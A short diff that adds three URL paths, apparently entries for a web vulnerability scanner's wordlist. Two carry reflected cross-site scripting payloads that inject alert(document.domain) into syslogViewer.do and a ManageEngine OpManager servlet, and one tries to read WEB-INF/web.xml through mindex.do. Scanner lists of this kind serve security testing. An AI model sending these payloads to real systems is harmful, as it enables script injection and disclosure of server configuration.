@@ -1,0 +1,3 @@
+/fw/syslogViewer.do?port=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/fw/mindex.do?url=./WEB-INF/web.xml%3f
+/servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=11111111%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
